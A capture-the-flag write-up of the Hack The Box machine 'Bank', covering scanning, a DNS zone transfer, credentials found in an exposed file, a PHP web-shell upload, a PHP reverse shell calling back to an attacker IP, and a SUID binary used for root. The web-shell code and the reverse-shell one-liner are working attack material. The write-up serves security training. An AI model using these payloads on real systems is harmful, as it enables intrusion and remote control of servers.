```
Bank is a relatively simple machine, however proper web enumeration is key to finding the necessary data for entry. There also exists an unintended entry method, which many users find before the correct data is located.
```

## nmap
``` nmap -sC -sV 10.10.10.29 ```

>    tarting Nmap 7.95 ( https://nmap.org ) at 2025-03-26 10:59 CET
	Nmap scan report for 10.10.10.29
	Host is up (0.033s latency).
	Not shown: 997 closed tcp ports (conn-refused)
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
	|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
	|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
	|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
	53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
	| dns-nsid: 
	|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
	80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
	|_http-title: Apache2 Ubuntu Default Page: It works
	|_http-server-header: Apache/2.4.7 (Ubuntu)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
>	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 50.61 seconds

We know thanks to nmap that inside this machine there are 3 open ports, 22, 53 and 80.

## Port 80
By accessing this page we notice the default page of ubuntu server, by adding the domain bank.htb on /etc/hosts we can notice a change to the page by accessing http://bank.htb

We have a login, doing the usual checks for sql injection and a login bypass I get nothing

## Port 53
```
dig axfr bank.htb @10.10.10.29
```
> <<>> DiG 9.20.7 <<>> axfr bank.htb @10.10.10.29
;; global options: +cmd
bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
bank.htb.		604800	IN	NS	ns.bank.htb.
bank.htb.		604800	IN	A	10.10.10.29
ns.bank.htb.		604800	IN	A	10.10.10.29
www.bank.htb.		604800	IN	CNAME	bank.htb.
bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
;; Query time: 35 msec
;; SERVER: 10.10.10.29#53(10.10.10.29) (TCP)
;; WHEN: Thu Mar 27 18:15:17 CET 2025

we note the following domains:
	1. ns.bank.htb
	2. chris.bank.htb

## Fuzzing
Doing a search with ffuf we can find an interesting directory called **balance-transfer**, this contains several files, one in particular shows some credentials.

http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc

```
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===

Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
```

## Login
I tried these credentials inside the login of http://bank.htb/login and I was successful, these redirected me to the panel

## Exploit

Browsing through the various pages we immediately notice the support (http://bank.htb/support.php) that allows us to attach a photo, looking at the source code of the page we can notice a comment that says:

```
<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
```

From here the way is simple, we can simply create a rce that runs on php.
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

To then start:
```
Server: php -r '$sock=fsockopen("10.10.X.X",9001);exec("sh <&3 >&3 2>&3");'

Client: nc -lnvp 9001
```

## RCE

Ok, we're in... let's see who we are right away!
```
>> id
   uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Let's set up a shell:
```
>> python3 -c 'import pty; pty.spawn("/bin/bash")'
>> export TERM=xterm
```

Checking the home we find a user named chris, entering it we can find the flag (user.txt)
```
7******************7
```

We check all files with privileges
```
>> find / -perm -4000 -type f 2>/dev/null

/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
```

Checking all the files we can notice a strange file, a non-normal file... (/var/htb/bin/emergency).
By entering its folder we can try to start it.

```
>> cd /var/htb/bin/
>> ./emergency
```

hmm, we have some sort of shell... let's try to do id

```
>> id
 uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
>> /root
>> ls
	root.txt
>> cat root.txt
	8****************e
```

Okay, this machine was a lot of fun! Most of all it made me think about how many websites can have this kind of vulnerability.

# The End